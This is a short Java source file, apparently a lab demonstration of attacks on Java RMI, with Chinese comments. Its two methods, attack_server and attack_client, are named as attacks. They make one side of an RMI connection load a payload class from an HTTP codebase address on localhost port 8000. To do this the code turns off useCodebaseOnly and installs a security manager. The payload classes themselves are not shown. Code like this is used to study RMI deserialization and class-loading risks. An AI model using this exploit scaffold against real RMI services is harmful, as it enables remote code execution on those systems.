import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.NotBoundException;
import java.rmi.RMISecurityManager;
import java.rmi.RemoteException;
import java.util.List;

import java.io.Serializable;
import java.util.Objects;

public class RMIClient implements Serializable {

    public static void attack_server() throws MalformedURLException, NotBoundException, RemoteException {

        IRemote remoteObj = (IRemote) Naming.lookup("rmi://127.0.0.1:1099/remoteObj");
        List<Integer> li = new Payload();//重点，服务端没有Payload类，需要从codebase地址加载
        li.add(3);
        li.add(4);
        System.out.println(remoteObj.sum(li));

    }

    public static void attack_client() throws MalformedURLException, NotBoundException, RemoteException {

        System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:8000/");
        System.setProperty("java.security.policy", Objects.requireNonNull(RMIClient.class.getClassLoader().getResource("java.policy")).getFile());
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        RMISecurityManager rmiSecurityManager = new RMISecurityManager();
        System.setSecurityManager(rmiSecurityManager);

        IRemote remoteObj = (IRemote) Naming.lookup("rmi://127.0.0.1:1099/remoteObj");
        Object object = remoteObj.getObject();

    }

    public static void main(String[] args) throws Exception {
        //RMI服务端从codebase地址加载类，在payload.class文件处开启http服务
//        attack_server();
        //RMI客户端从codebase地址加载类，在payload2.class文件处开启http服务
        attack_client();

    }
}